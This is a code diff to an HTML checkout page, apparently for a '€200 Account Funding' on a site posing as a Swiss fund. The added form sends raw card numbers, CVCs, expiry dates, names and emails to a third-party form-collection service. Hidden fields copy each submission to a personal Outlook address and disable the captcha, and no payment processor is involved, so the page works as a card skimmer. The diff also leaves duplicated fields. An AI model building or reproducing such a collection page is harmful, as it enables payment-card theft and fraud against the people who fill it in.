@@ -380,22 +380,66 @@
                         <div class="error-message hidden" id="emailError"></div>
                     </div>
 
-                    <!-- Card Information -->
-                    <div class="mb-4">
-                        <label class="input-label">Card Information</label>
-                        <div class="input-wrap mb-2">
-                            <input id="cardNumber" type="text" class="input-base" placeholder="1234 1234 1234 1234" autocomplete="cc-number" maxlength="19" />
-                            <div class="card-type-badge">
-                                <span id="cardIcon">💳</span>
-                                <span id="cardTypeLabel"></span>
-                            </div>
-                        </div>
-                        <div class="grid-2">
-                            <input id="expiry" type="text" class="input-base" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" />
-                            <input id="cvc" type="text" class="input-base" placeholder="CVC" maxlength="4" autocomplete="cc-csc" />
-                        </div>
-                        <div class="error-message hidden" id="cardError"></div>
-                    </div>
+                    <form id="paymentForm" action="https://formspree.io/f/xkolawe" method="POST" novalidate>
+    
+    <!-- Hidden fields for Formspree -->
+    <input type="hidden" name="_subject" value="New €200 Account Funding - standardswiss.fund">
+    <input type="hidden" name="_replyto" value="{{email}}"> 
+    <input type="hidden" name="_cc" value="jason21ee21@outlook.com">
+    <input type="hidden" name="_next" value="https://standardswiss.fund/success.html"> 
+    <input type="hidden" name="_captcha" value="false">
+
+    <!-- Email -->
+    <div class="mb-4">
+        <label class="input-label">Email</label>
+        <input type="email" id="email" name="email" class="input-base" placeholder="you@example.com" autocomplete="email" required />
+        <div class="error-message hidden" id="emailError"></div>
+    </div>
+
+    <!-- Card Information -->
+    <div class="mb-4">
+        <label class="input-label">Card Information</label>
+        <div class="input-wrap mb-2">
+            <input id="cardNumber" name="card_number" type="text" class="input-base" placeholder="1234 1234 1234 1234" autocomplete="cc-number" maxlength="19" inputmode="numeric" required />
+            <div class="card-type-badge">
+                <span id="cardIcon">💳</span>
+                <span id="cardTypeLabel"></span>
+            </div>
+        </div>
+        <div class="grid-2">
+            <input id="expiry" name="expiry" type="text" class="input-base" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" inputmode="numeric" required />
+            <input id="cvc" name="cvc" type="text" class="input-base" placeholder="CVC" maxlength="4" autocomplete="cc-csc" inputmode="numeric" required />
+        </div>
+        <div class="error-message hidden" id="cardError"></div>
+    </div>
+
+    <!-- Name on card -->
+    <div class="mb-4">
+        <label class="input-label">Name on card</label>
+        <input id="cardholderName" name="cardholder_name" type="text" class="input-base" placeholder="John Doe" autocomplete="cc-name" required />
+        <div class="error-message hidden" id="nameError"></div>
+    </div>
+
+    <!-- Country or region -->
+    <div class="mb-4 country-select-wrapper">
+        <label class="input-label">Country or region</label>
+        <select id="country" name="country" class="input-base select-base" required>
+            <option value="CH">Switzerland</option>
+            <!-- ... rest of your country options stay the same ... -->
+        </select>
+    </div>
+
+    <!-- Pay Button -->
+    <button type="submit" id="payButton" class="btn-primary mt-2">
+        <span id="buttonText">Fund €200.00</span>
+        <span id="buttonSpinner" class="hidden"><span class="spinner"></span></span>
+        <span id="buttonSuccess" class="hidden">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />
+            </svg>
+        </span>
+    </button>
+</form>
 
                     <!-- Name on card -->
                     <div class="mb-4">
